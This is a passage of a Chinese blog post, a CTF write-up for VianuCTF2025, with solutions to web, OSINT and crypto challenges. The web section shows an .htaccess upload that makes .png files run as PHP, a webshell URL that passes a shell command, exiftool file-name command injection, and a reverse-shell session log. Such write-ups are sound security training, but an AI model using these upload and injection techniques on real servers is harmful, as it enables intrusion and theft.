href="/posts/f8a60ebc/">春秋云境-GreatWall</a></li><li class="sidebar-cat-post"><a href="/posts/7ea084a1/">春秋云境-Spoofing</a></li><li class="sidebar-cat-post"><a href="/posts/a5238ac2/">春秋云境-ThermalPower</a></li><li class="sidebar-cat-post"><a href="/posts/cb0f9c73/">春秋云境-Privilege</a></li><li class="sidebar-cat-post"><a href="/posts/9aa9ec9/">春秋云境-Time</a></li><li class="sidebar-cat-post"><a href="/posts/beaf5221/">春秋云境-TunnelX</a></li><li class="sidebar-cat-post"><a href="/posts/3731c1f5/">春秋云境-无间计划</a></li><li class="sidebar-cat-post"><a href="/posts/a0288562/">春秋云境-Tsclient</a></li><li class="sidebar-cat-post"><a href="/posts/aa8a0593/">春秋云境-CloudNet</a></li><li class="sidebar-cat-post"><a href="/posts/327fc326/">春秋云境-Initial</a></li><li class="sidebar-cat-post"><a href="/posts/a3698f4a/">春秋云境-Delivery</a></li><li class="sidebar-cat-post"><a href="/posts/d66aab01/">春秋云境-Hospital</a></li></ul></details></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://ta0.fun/posts/aa344180/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">VianuCTF2025-Writeup</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-12-17 13:00:47" itemprop="dateCreated datePublished" datetime="2025-12-17T13:00:47+08:00">2025-12-17</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">2.1k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">11m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/CTFWP/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTFWP</span></a></span></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p>被外国高中生薄纱的一次,前面全是高中生。</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="know-ya’-headers"><a href="#know-ya’-headers" class="headerlink" title="know ya’ headers"></a>know ya’ headers</h3><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1
+Host: 34.141.66.130:31872
+User-Agent: vianu_browser
+Origin: http:&#x2F;&#x2F;portal.lbi.ro&#x2F;
+Date: Fri, 28 Nov 2025 05:43:00 GMT
+Connection: close</code></pre>
+
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216184821.png" alt="image.png" loading="lazy"></p>
+<h3 id="i-need-a-job"><a href="#i-need-a-job" class="headerlink" title="i need a job"></a>i need a job</h3><p>apache直接上传<code>.htaccess</code></p>
+<pre class="language-none"><code class="language-none">&lt;FilesMatch &quot;1.png&quot;&gt;
+SetHandler application&#x2F;x-httpd-php
+AddHandler php5-script .png          
+&lt;&#x2F;FilesMatch&gt;</code></pre>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216160828.png" alt="image.png" loading="lazy"></p>
+<p>再上传一个马改名为1.png</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;34.89.137.232:32156&#x2F;uploads&#x2F;1.png?1&#x3D;cat%20&#x2F;b1n&#x2F;flag.txt</code></pre>
+
+<h3 id="6-lei"><a href="#6-lei" class="headerlink" title="6 lei"></a>6 lei</h3><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216180111.png" alt="image.png" loading="lazy"></p>
+<h3 id="7-lei"><a href="#7-lei" class="headerlink" title="7 lei"></a>7 lei</h3><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216185327.png" alt="image.png" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">CTF&#123;you_n0w_g0T_67lei!_gg&#125;</code></pre>
+
+<h3 id="Vibe-RPC"><a href="#Vibe-RPC" class="headerlink" title="Vibe RPC"></a>Vibe RPC</h3><p>猜测是exiftool命令拼接，测试发现时间出有waf，不过可以再文件名字出拼接命令</p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216190648.png" alt="image.png" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">Connection received on 185.213.240.231 42342
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@51aed2637ab5:&#x2F;var&#x2F;www&#x2F;html$ id
+id
+uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)
+www-data@51aed2637ab5:&#x2F;var&#x2F;www&#x2F;html$ cat &#x2F;home&#x2F;ctf&#x2F;f*
+cat &#x2F;home&#x2F;ctf&#x2F;f*
+Vianu_CTF&#123;rotate_your_crops_the_land_rarely_provides_shells&#125;</code></pre>
+
+
+<h3 id="Rice-Harder-unsolved"><a href="#Rice-Harder-unsolved" class="headerlink" title="Rice Harder(unsolved)"></a>Rice Harder(unsolved)</h3><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="C-it’s-Still-a-Thing-in-2025"><a href="#C-it’s-Still-a-Thing-in-2025" class="headerlink" title="C it’s Still a Thing in 2025"></a>C it’s Still a Thing in 2025</h3><p>打开就有<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216154432.png" alt="image.png" loading="lazy"></p>
+<h2 id="osint"><a href="#osint" class="headerlink" title="osint"></a>osint</h2><h3 id="Find-It"><a href="#Find-It" class="headerlink" title="Find It"></a>Find It</h3><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216155046.png" alt="image.png" loading="lazy"><br>flickr搜索N0th1ngUs3r</p>
+<h3 id="Ancient-Routes"><a href="#Ancient-Routes" class="headerlink" title="Ancient Routes"></a>Ancient Routes</h3><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216210223.png" alt="image.png" loading="lazy"></p>
+<p>最早于01&#x2F;27&#x2F;11<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216210252.png" alt="image.png" loading="lazy"></p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
+<span class="token keyword">import</span> hashlib
+
+<span class="token keyword">def</span> <span class="token function">rot13</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    
+    <span class="token keyword">for</span> char <span class="token keyword">in</span> text<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token string">'a'</span> <span class="token operator">&lt;=</span> char <span class="token operator">&lt;=</span> <span class="token string">'z'</span><span class="token punctuation">:</span>  
+            shifted <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>shifted<span class="token punctuation">)</span>
+        <span class="token keyword">elif</span> <span class="token string">'A'</span> <span class="token operator">&lt;=</span> char <span class="token operator">&lt;=</span> <span class="token string">'Z'</span><span class="token punctuation">:</span>  
+            shifted <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>shifted<span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>  
+            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>char<span class="token punctuation">)</span>
+    
+    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+s <span class="token operator">=</span> <span class="token string">"altoid_243390_http://tydgccykixpbu6uz.onion"</span>
+s_rot<span class="token operator">=</span>rot13<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>s_rot<span class="token punctuation">)</span>
+s_b64<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>s_rot<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>s_b64<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Vianu_CTF&#123;"</span><span class="token operator">+</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>s_b64<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span></code></pre>
+
+<pre class="language-none"><code class="language-none">Vianu_CTF&#123;dd951c9000a8f8d90d1afcb7d1b31049f161e53b3d3547114319b2cb6cbf52fe&#125;</code></pre>
+
+<h3 id="Life-After-High-School"><a href="#Life-After-High-School" class="headerlink" title="Life After High School"></a>Life After High School</h3><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216214435.png" alt="image.png" loading="lazy"><br>ctf{coffee-star}</p>
+<h3 id="Unexpected-Message"><a href="#Unexpected-Message" class="headerlink" title="Unexpected Message"></a>Unexpected Message</h3><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/94d8fb4a00cf2692063c22509cb33616.jpg" alt="94d8fb4a00cf2692063c22509cb33616.jpg" loading="lazy"><br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/9323a67e78ff489b4ae8a0c830460702.jpg" alt="9323a67e78ff489b4ae8a0c830460702.jpg" loading="lazy"><br>CTF{5c4mm3r_m3375_4_81993r_f15h}</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="cute-cat"><a href="#cute-cat" class="headerlink" title="cute cat"></a>cute cat</h3><p>binwalki分出一个压缩包，可以爆破密码</p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216155646.png" alt="image.png" loading="lazy"><br>得到</p>
+<pre class="language-none"><code class="language-none">Private key:MIIBVAIBADANBgkqhkiG9w0BAQEFAASCAT4wggE6AgEAAkEAiJrin5zrX8hwQzIXj8yL+l79LCj8pyzxbltb0JLjKAJFn&#x2F;uIWlcgdcujGDVLNrOeYgLPqSiz9&#x2F;fgQMq4OYOk9wIDAQABAkAdSSdAlMGZPT1kCn8movF3cZnRN9BCfs4bnJZodrUgRFjmeBP8WuoBVJVWcRH27l6OJiiiliSoWT&#x2F;exd62NloRAiEA+Vs3LrOHyTzj06keCA50p11&#x2F;CPxO3keUGtQly8s0v5sCIQCMPqCFJ5O3WZUmN+lNbwJDWkjWE4c8cckJmwnpZ5671QIhAO9+hXysYBGPEv664qY4RCBvc1DNDG7&#x2F;bqdp9TdMX8hbAiBIn3GeIjVy&#x2F;5ell9RfPbnNSOZovOoN2dpB+B&#x2F;01qyzFQIgDwgxA70XqFaSmSn6tEv2mDf81oa&#x2F;8Es8WHwlk0bdGeg&#x3D;
+
+B5iYMD0tyaLTvKnz8onEcibrqgmUKUn1tpiCojI8+upQHk&#x2F;o7lm+LB+C1709+QrVrGPKG0aeGPm1Obv0PH99RQ&#x3D;&#x3D;
+</code></pre>
+
+<p>rsa</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
+<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA
+<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_v1_5
+
+
+key_data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""-----BEGIN RSA PRIVATE KEY-----
+MIIBVAIBADANBgkqhkiG9w0BAQEFAASCAT4wggE6AgEAAkEAiJrin5zrX8hwQzIXj8yL+l79LCj8pyzxbltb0JLjKAJFn/uIWlcgdcujGDVLNrOeYgLPqSiz9/fgQMq4OYOk9wIDAQABAkAdSSdAlMGZPT1kCn8movF3cZnRN9BCfs4bnJZodrUgRFjmeBP8WuoBVJVWcRH27l6OJiiiliSoWT/exd62NloRAiEA+Vs3LrOHyTzj06keCA50p11/CPxO3keUGtQly8s0v5sCIQCMPqCFJ5O3WZUmN+lNbwJDWkjWE4c8cckJmwnpZ5671QIhAO9+hXysYBGPEv664qY4RCBvc1DNDG7/bqdp9TdMX8hbAiBIn3GeIjVy/5ell9RfPbnNSOZovOoN2dpB+B/01qyzFQIgDwgxA70XqFaSmSn6tEv2mDf81oa/8Es8WHwlk0bdGeg=
+-----END RSA PRIVATE KEY-----"""</span>
+
+cipher_b64 <span class="token operator">=</span> <span class="token string">"B5iYMD0tyaLTvKnz8onEcibrqgmUKUn1tpiCojI8+upQHk/o7lm+LB+C1709+QrVrGPKG0aeGPm1Obv0PH99RQ=="</span>
+ciphertext <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cipher_b64<span class="token punctuation">)</span>
+
+<span class="token keyword">try</span><span class="token punctuation">:</span>
+
+    rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>key_data<span class="token punctuation">)</span>
+    cipher <span class="token operator">=</span> PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsakey<span class="token punctuation">)</span>
+    sentinel <span class="token operator">=</span> <span class="token string">b"Decrypt Error"</span>
+    plaintext <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> sentinel<span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密结果:"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"发生错误: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre>
+
+<h3 id="Polar-Note"><a href="#Polar-Note" class="headerlink" title="Polar Note"></a>Polar Note</h3><p>猜测是维吉尼亚密码，密钥是6位循环<br>可以先将密文按6位分组，尝试解密每组的前4个字母。</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">vigenere_decrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    decrypted <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    key_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i<span class="token punctuation">,</span> char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> char<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment"># Convert A-Z to 0-25</span>
+            c <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span>
+            k <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> key_length<span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span>
+            <span class="token comment"># Decrypt: (Cipher - Key) mod 26</span>
+            p <span class="token operator">=</span> <span class="token punctuation">(</span>c <span class="token operator">-</span> k<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span>
+            decrypted<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            decrypted<span class="token punctuation">.</span>append<span class="token punctuation">(</span>char<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>decrypted<span class="token punctuation">)</span>
+
+ciphertext <span class="token operator">=</span> <span class="token string">"IQSLLEBYESWDKPEJWQBFRWHOFR"</span>
+key <span class="token operator">=</span> <span class="token string">"XMASDJ"</span>
+
+plaintext <span class="token operator">=</span> vigenere_decrypt<span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Key: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>key<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Raw Plaintext: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>plaintext<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Flag prediction: CTF&#123;&#123;</span><span class="token interpolation"><span class="token punctuation">&#123;</span>plaintext<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'LESTIVE'</span><span class="token punctuation">,</span> <span class="token string">'FESTIVE'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'FIF'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">&#125;&#125;"</span></span><span class="token punctuation">)</span></code></pre>
+
+<pre class="language-none"><code class="language-none">CTF&#123;FESTIVEMEATUNDERTHETREE&#125;</code></pre>
+
+<h3 id="Do-you-like-crypto"><a href="#Do-you-like-crypto" class="headerlink" title="Do you like crypto???"></a>Do you like crypto???</h3><p>1.Beep Boop</p>
+<pre class="language-none"><code class="language-none">...- .. .- -. ..- ..--.- -.-. - ..-.  -- ----- ----- .-. ... ...-- ..--.- -.-. ----- -.. ...-- ...-- ...-- ...-- </code></pre>
+<p>摩斯密码</p>
+<pre class="language-none"><code class="language-none">Vianu_CTF&#123;M00RS3_C0D3333&#125;</code></pre>
+
+<p>2.Do you know your base?</p>
+<pre class="language-none"><code class="language-none">KZUWC3TVL5BVIRT3MI2HGM27GMZF6MLTL5THK3T5</code></pre>
+<p>base32</p>
+<pre class="language-none"><code class="language-none">Vianu_CTF&#123;b4s3_32_1s_fun&#125;</code></pre>
+
+<p>3.Something something charcode 12 something something</p>
+<pre class="language-none"><code class="language-none">72 89 81 92 99 7b 57 70 5a a3 83 88 44 96 83 40 84 43 7b 89 87 a5</code></pre>
+<p>12进制</p>
+<pre class="language-none"><code class="language-none">Vianu_CTF&#123;ch4rc0d3_ig&#125;</code></pre>
+
+
+
+<p>4.Lets try some hashing:), find the word in the middle. flag format: Vianu_CTF{example}</p>
+<pre class="language-none"><code class="language-none">5b44033a88cd84a07e9b309ff6d584a3</code></pre>
+<p>md4<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216162406.png" alt="image.png" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">Vianu_CTF&#123;highschool&#125;</code></pre>
+
+<p>5.Can you rotate?</p>
+<pre class="language-none"><code class="language-none">&#39;:2?F0r%uL&#x3D;bbbEDD0C___E0cfN</code></pre>
+<p>rot47</p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216162449.png" alt="image.png" loading="lazy"></p>
+<p>6.The alphabet in this challenge went to therapy and decided it wanted to be the complete opposite of itself. Decode its midlife crisis</p>
+<pre class="language-none"><code class="language-none">Erzmf_XGU&#123;n1wo1u3_xi1hhrh&#125;</code></pre>
+<p>atbash</p>
+<pre class="language-none"><code class="language-none">Vianu_CTF&#123;m1dl1f3_cr1ssis&#125;</code></pre>
+
+<p>7.This one should be easy, right?</p>
+<pre class="language-none"><code class="language-none">2)ZR8A0&lt;d?+&gt;u2%2DQC5AKWig+&gt;u,#2)-400d&amp;&gt;&#x2F;+&gt;c#&quot;2DlU51E\Sb+?)5%2DcO62BXe9+?!dR2DQC6@3@Bb+&gt;u,#2DcO52]t&quot;;+?*^O2)l^;@3@C&lt;+&gt;Ynu2)l^71*AG_+?))!1h@dd2]t&quot;8+&gt;u,#1h7^c3$:(:+&gt;Y\o1cZ[91E\Sb+&gt;[O</code></pre>
+
+<p>base85-hex-base64<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251217113333.png" alt="image.png" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">Vianu_CTF&#123;y0u_go1_th3_3z_fl4g_0ut!)</code></pre>
+
+<p>8.My colleague keeps saying that the key is “Vianu”</p>
+<pre class="language-none"><code class="language-none">Qqaao_XBF&#123;1_y0p3_Q1o3n3e3&#125;</code></pre>
+
+<p>用密钥 <code>Vianu</code> 对密文 <code>Qqaao_XBF&#123;1_y0p3_Q1o3n3e3&#125;</code> 进行维吉尼亚解密</p>
+<pre class="language-none"><code class="language-none">vianu_ctf&#123;1_l0v3_v1g3n3r3&#125;</code></pre>
+
+<p>9.Q9. The flag is 13th of octal. (Points: 49)</p>
+<pre class="language-none"><code class="language-none">*96-$6.96Y96-96Y96.96-$6&#x2F;96NJ6$96%X6*96BD6$96-$6:96%X6.96Y96+96E&#x2F;6.96BD6.96E&#x2F;6&#x2F;96-$6S%6634TY6634:96634&#x2F;D6634T%6634-D6634HJ66343:6</code></pre>
+<p>rot13-&gt;base45-&gt;octal<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251217113251.png" alt="image.png" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">VianuCTF&#123;i_lov3_Octal&#125;</code></pre>
+
+
+<p>10.My flag got flipped by a train while being on a rail on the 3rd key</p>
+<pre class="language-none"><code class="language-none">xgts111Cat3_nh30_d_d_d&#123;T_ni&#125;t1mkkkFuV</code></pre>
+<p>倒序+栅栏</p>
+<pre class="language-none"><code class="language-none">Vianu_CTF&#123;1dk_1dk_1dk_s0m3th1ng_t3xt&#125;</code></pre>
+
+<h3 id="A-fibodream-come-true"><a href="#A-fibodream-come-true" class="headerlink" title="A fibodream come true"></a>A fibodream come true</h3><p>加密逻辑是针对每个字符进行某种基于位置的位移，然后哈希化。由于哈希对应的是单个字符，搜索空间极小.直接生成可见字符的 SHA256 彩虹表，将题目给出的哈希值还原为密文字符</p>
+<pre class="language-none"><code class="language-none">Hrvty_KHN&#123;30gi27e5hj18mru9m2f15pwqo4v36s05p3nb2az0&#125;</code></pre>
+
+<p>服务器作为一个 Oracle，会加密我们发送的内容<br>发送 51 个 <code>&#39;a&#39;</code>，根据返回的密文计算出每个位置针对<strong>字母</strong>的偏移量。<br>发送 51 个 <code>&#39;0&#39;</code>，根据返回的密文计算出每个位置针对<strong>数字</strong>的偏移量。<br>利用计算出的偏移量，对第一步恢复的密文进行逆运算,即可得到 Flag。</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
+<span class="token keyword">import</span> string
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment"># 1. The Hashes</span>
+hashes <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">"44bd7ae60f478fae1061e11a7739f4b94d1daf917982d33b6fc8a01a63f89c21"</span><span class="token punctuation">,</span>
+    <span class="token string">"454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1"</span><span class="token punctuation">,</span>
+    <span class="token string">"4c94485e0c21ae6c41ce1dfe7b6bfaceea5ab68e40a2476f50208e526f506080"</span><span class="token punctuation">,</span>
+    <span class="token string">"e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8"</span><span class="token punctuation">,</span>
+    <span class="token string">"a1fce4363854ff888cff4b8e7875d600c2682390412a8cf79b37d0b11148b0fa"</span><span class="token punctuation">,</span>
+    <span class="token string">"d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde"</span><span class="token punctuation">,</span>
+    <span class="token string">"86be9a55762d316a3026c2836d044f5fc76e34da10e1b45feee5f18be7edb177"</span><span class="token punctuation">,</span>
+    <span class="token string">"44bd7ae60f478fae1061e11a7739f4b94d1daf917982d33b6fc8a01a63f89c21"</span><span class="token punctuation">,</span>
+    <span class="token string">"8ce86a6ae65d3692e7305e2c58ac62eebd97d3d943e093f577da25c36988246b"</span><span class="token punctuation">,</span>
+    <span class="token string">"021fb596db81e6d02bf3d2586ee3981fe519f275c0ac9ca76bbcf2ebb4097d96"</span><span class="token punctuation">,</span>
+    <span class="token string">"4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce"</span><span class="token punctuation">,</span>
+    <span class="token string">"5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9"</span><span class="token punctuation">,</span>
+    <span class="token string">"cd0aa9856147b6c5b4ff2b7dfee5da20aa38253099ef1b4a64aced233c9afe29"</span><span class="token punctuation">,</span>
+    <span class="token string">"de7d1b721a1e0632b7cf04edf5032c8ecffa9f9a08492152b926f1a5a7e765d7"</span><span class="token punctuation">,</span>
+    <span class="token string">"d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35"</span><span class="token punctuation">,</span>
+    <span class="token string">"7902699be42c8a8e46fbbb4501726517e86b22c56a189f7625a6da49081b2451"</span><span class="token punctuation">,</span>
+    <span class="token string">"3f79bb7b435b05321651daefd374cdc681dc06faa65e374e38337b88ca046dea"</span><span class="token punctuation">,</span>
+    <span class="token string">"ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d"</span><span class="token punctuation">,</span>
+    <span class="token string">"aaa9402664f1a41f40ebbc52c9993eb66aeb366602958fdfaa283b71e64db123"</span><span class="token punctuation">,</span>
+    <span class="token string">"189f40034be7a199f1fa9891668ee3ab6049f82d38c68be70f596eab2e1857b7"</span><span class="token punctuation">,</span>
+    <span class="token string">"6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b"</span><span class="token punctuation">,</span>
+    <span class="token string">"2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3"</span><span class="token punctuation">,</span>
+    <span class="token string">"62c66a7a5dd70c3146618063c344e531e6d4b59e379808443ce962b3abd63c5a"</span><span class="token punctuation">,</span>
+    <span class="token string">"454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1"</span><span class="token punctuation">,</span>
+    <span class="token string">"0bfe935e70c321c7ca3afc75ce0d0ca2f98b5422e008bb31c00c6d7f1f1c0ad6"</span><span class="token punctuation">,</span>
+    <span class="token string">"19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7"</span><span class="token punctuation">,</span>
+    <span class="token string">"62c66a7a5dd70c3146618063c344e531e6d4b59e379808443ce962b3abd63c5a"</span><span class="token punctuation">,</span>
